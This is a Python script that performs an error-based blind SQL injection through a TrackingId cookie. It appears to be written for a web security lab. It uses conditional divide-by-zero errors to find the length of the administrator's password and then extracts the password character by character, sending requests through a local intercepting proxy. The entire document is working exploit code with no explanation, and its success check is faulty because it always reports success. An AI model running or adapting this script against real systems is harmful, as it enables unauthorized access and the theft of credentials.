import requests
import sys
import urllib3
import urllib
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080', 'https':'http://127.0.0.1:8080'}

def get_cookies(url):
	r = requests.get(url, verify=False)
	cookies = r.cookies
	trackingId = cookies.get('TrackingId')
	session = cookies.get('session')
	cookies_obtain = [trackingId, session]
	return cookies_obtain

def get_pass_len(url, cookies_obtained):
	for i in range (1,50):
		payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND LENGTH(password)>{i})--"
		payload_encode = urllib.parse.quote(payload)
		cookies = {'TrackingId': cookies_obtained[0] + payload_encode, 'session': cookies_obtained[1]}
		r = requests.get(url, cookies=cookies, verify=False)
		if r.status_code == 200:
			return i + 1

def sqli_exploit(url):
	cookies_obtained = get_cookies(url)
	password_length = get_pass_len(url, cookies_obtained)
	password = "\033[34m[+] Password: \033[0m"
	for i in range(1, password_length):
		for j in range(32, 126):
			payload = f"' || (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator' AND ASCII(SUBSTR(password,{i},1))='{j}')--"
			payload_encode = urllib.parse.quote(payload)
			cookies = {'TrackingId': cookies_obtained[0] + payload_encode, 'session': cookies_obtained[1]}
			r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
			if r.status_code == 200:
				sys.stdout.write('\r' + password + chr(j))
				sys.stdout.flush()
			else:
				password += chr(j)
				sys.stdout.write('\r' + password)
				sys.stdout.flush()
				break

if __name__ == "__main__":
	try:
		url = sys.argv[1].strip()
	except IndexError:
		print(f'\033[31m[-] Usage: {sys.argv[0]} <url>\033[0m')
		print(f'\033[31m[-] Example: {sys.argv[0]} http://www.example.com\033[0m')
		sys.exit(1)
	print('\033[32m[+] Retrieving administrator password...\033[0m')
	sqli_exploit(url)

	if sqli_exploit:
		print('\033[32m[+] SQLi Successful!\033[0m')
	else:
		print('\033[31m[-] SQLi Unsuccessful!!!\033[0m')
